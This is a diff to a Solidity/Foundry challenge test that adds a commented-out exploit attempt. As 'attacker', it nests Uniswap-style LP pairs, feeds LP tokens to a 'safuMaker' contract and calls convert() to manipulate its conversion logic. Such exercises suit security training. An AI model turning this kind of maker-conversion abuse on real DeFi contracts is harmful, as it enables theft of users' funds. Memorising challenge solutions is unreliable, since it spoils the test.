@@ -113,6 +113,46 @@ contract Testing is Test {
 
         // implement solution here
 
+        //This time this will be not an vulerability of the code but about the logic
+        /*
+        usdc.approve(address(safuRouter),type(uint).max);
+        vm.prank(admin);
+        safu.approve(address(safuRouter),type(uint).max);
+        safuRouter.addLiquidity(
+            address(usdc),address(safu),
+            10e18,
+            10e18,
+            0,0,
+            admin,block.timestamp
+        );
+
+        // --getting the USDC-SAFU trading pair
+        safuPair = IUniswapV2Pair(safuFactory.getPair(address(usdc),address(safu)));
+
+        safuPair.approve(address(safuRouter),type(uint).max);
+        safuRouter.addLiquidity(
+            address(safuPair),address(safu),
+            safuPair.balanceOf(attacker),
+            10e18,
+            0,0,
+            attacker,block.timestamp
+        );
+
+        // --getting the LP(USDC-SAFU)-SAFU trading pair
+        IUniswapV2Pair sifuPair = IUniswapV2Pair(safuFactory.getPair(address(safuPair),address(safu)));
+        console.log("LP sifuPair : ",sifuPair.balanceOf(address(attacker)));
+
+        sifuPair.transfer(address(safuMaker),1e18);
+        safuMaker.convert(address(safuPair),address(safu));
+
+        (uint256 reserve0, uint256 reserve1, ) = sifuPair.getReserves();
+
+        console.log("reserveO : ",reserve0," reserve1 : ",reserve1 );*/
+
+
+
+
+
         vm.stopPrank();
         validation();
     }
